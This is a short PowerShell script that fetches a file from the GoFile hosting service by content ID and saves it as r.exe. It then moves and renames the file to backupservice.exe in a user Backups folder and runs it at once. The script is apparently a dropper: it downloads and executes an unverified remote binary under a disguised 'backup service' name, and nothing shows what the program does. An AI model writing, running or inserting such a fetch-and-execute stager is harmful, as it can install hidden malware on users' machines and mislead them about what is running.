# Variables
$ContentID = "SplUgh"
$OutFile = "$env:USERPROFILE\Downloads\r.exe"
$BackupDir = "$env:USERPROFILE\Backups"
$BackupFile = "$BackupDir\backupservice.exe"

Write-Host "Getting file info from GoFile..."

# Download JSON response
$response = Invoke-RestMethod -Uri "https://api.gofile.io/contents/$ContentID"

# Extract download URL from JSON
$URL = $response.data.contents | Where-Object { $_.name -like "*" } | Select-Object -ExpandProperty downloadPage

if (-not $URL) {
    Write-Error "Download URL not found!"
    exit
}

Write-Host "Downloading from $URL ..."
Invoke-WebRequest -Uri $URL -OutFile $OutFile

# Ensure backup folder exists
if (-not (Test-Path -Path $BackupDir)) {
    New-Item -ItemType Directory -Path $BackupDir | Out-Null
}

# Move and rename downloaded file
Move-Item -Path $OutFile -Destination $BackupFile -Force

# Run the backup service
Start-Process -FilePath $BackupFile
